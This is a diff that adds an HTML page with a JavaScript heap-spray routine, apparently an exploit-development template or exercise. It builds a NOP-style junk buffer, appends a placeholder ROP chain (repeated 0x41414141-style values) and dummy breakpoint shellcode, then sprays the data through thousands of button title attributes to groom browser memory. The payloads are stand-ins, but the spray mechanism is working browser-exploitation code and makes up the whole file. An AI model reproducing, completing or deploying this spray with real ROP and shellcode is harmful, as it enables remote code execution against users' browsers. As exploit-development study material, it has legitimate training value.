@@ -1,0 +1,31 @@
+<html>
+<head></head>
+<body>
+<div id="blah"></div>
+<script language = 'javascript'>
+	var div_container = document.getElementById("blah");
+	div_container.style.cssText = "display:none";
+	var data;
+	offset = 0x104;    
+	junk = unescape("%u9090%u9090");
+	while (junk.lenght < 0x1000) junk += junk;    
+	
+	rop = unescape("%u4141%u4141%u4242%u4242%u4343%u4343%u4444%u4444%u4545%u4545%u4646%u4646%u4747%u4747");
+	shellcode = unescape("%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc");
+	data = junk.substring(0,offset) + rop + shellcode
+	data += junk.substring(0, 0x80000-offset-rop.length-shellcode.lenght);   
+	
+	while (data.length < 0x80000) data += data;    
+	
+	
+	for (var i = 0; i < 0x7000; i++)   
+	{
+		var obj = document.createElement("button");
+		obj.title = data.substring(0, 0x500-0x58);   
+		div_container.appendChild(obj);
+	}
+	alert("spray done");
+</script>
+</body>
+</html>
+	
